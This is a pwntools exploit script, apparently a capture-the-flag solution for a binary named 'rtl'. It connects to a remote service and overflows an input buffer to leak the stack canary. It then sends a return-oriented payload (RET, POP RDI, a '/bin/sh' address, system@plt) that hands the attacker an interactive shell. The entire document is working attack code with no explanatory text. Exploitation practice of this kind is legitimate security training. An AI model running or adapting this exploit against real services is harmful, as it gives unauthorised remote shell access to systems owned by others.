#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/rtl")


payload = b"A" * 0x39

r.sendafter(b"Buf: ", payload)
r.recvuntil(payload)
canary = pwn.u64(b"\x00" + r.recvn(7))

pwn.success(hex(canary))

POP_RDI = 0x0000000000400853
RET = 0x0000000000400285
BINSH = 0x0000000000400874

payload = b"B" * 0x38
payload += pwn.p64(canary)
payload += b"C" * 0x08
payload += pwn.p64(RET)
payload += pwn.p64(POP_RDI)
payload += pwn.p64(BINSH)
payload += pwn.p64(e.plt["system"])

r.sendlineafter(b"Buf: ", payload)

r.interactive()